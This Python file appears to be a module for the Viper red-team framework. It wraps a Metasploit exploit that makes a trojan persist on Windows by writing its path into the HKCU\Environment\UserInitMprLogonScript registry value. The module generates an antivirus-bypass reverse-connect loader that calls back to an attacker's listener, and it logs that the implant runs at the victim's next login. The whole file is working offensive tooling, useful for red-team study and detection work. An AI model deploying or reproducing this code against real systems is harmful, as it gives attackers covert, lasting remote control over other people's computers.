# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Windows登录脚本持久化"
    DESC_ZH = "通过在注册表\n" \
              "HKCU\\Environment\\UserInitMprLogonScript中写入木马文件路径实现持久化.\n" \
              "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."

    NAME_EN = "Windows logon script persistence"
    DESC_EN = "Via the registry\n" \
              "HKCU\\Environment\\UserInitMprLogonScript writes the path of the Trojan file to achieve persistence.\n" \
              "When using the module, do not turn off the corresponding handler, the Loader needs to be connected back to the monitoring to obtain the core library files."

    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1037"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/mwd52l"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1037/"]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionHander(),
        OptionFileEnum(ext=['exe'], required=False),
        OptionCacheHanderConfig(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_logon_scripts"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        if 'windows' not in self.get_handler_payload().lower():
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        self.set_payload_by_handler()

        filepath = self.get_fileoption_filepath(msf=True)
        if filepath is None:  # 根据监听进行持久化
            exe_filepath = self.generate_bypass_exe_file(template="REVERSE_HEX_BASE")
        else:
            Notice.send_info("使用自定义的loader进行持久化", "Use custom loader for persistence")
            exe_filepath = filepath

        self.set_msf_option("EXE::Custom", exe_filepath)
        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"EXE路径: {data}", f"EXE path: {data}")
            self.log_good(f"用户下次登录时生效", "Take effect the next time the user login")
            self.cache_handler()
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
